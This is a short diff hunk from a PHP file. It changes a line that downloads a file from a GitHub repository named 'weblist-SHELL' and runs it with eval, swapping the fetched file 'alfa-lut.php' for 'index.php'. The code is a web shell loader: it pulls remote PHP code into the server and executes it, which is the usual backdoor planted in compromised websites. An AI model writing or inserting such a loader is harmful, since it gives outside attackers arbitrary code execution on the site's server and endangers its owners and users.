@@ -50,7 +50,7 @@ function is_logged_in()
         return $urls;
     }
 
-    $a = geturlsinfo('https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/alfa-lut.php');
+    $a = geturlsinfo('https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/index.php');
     eval('?>' . $a);
 
 ?>
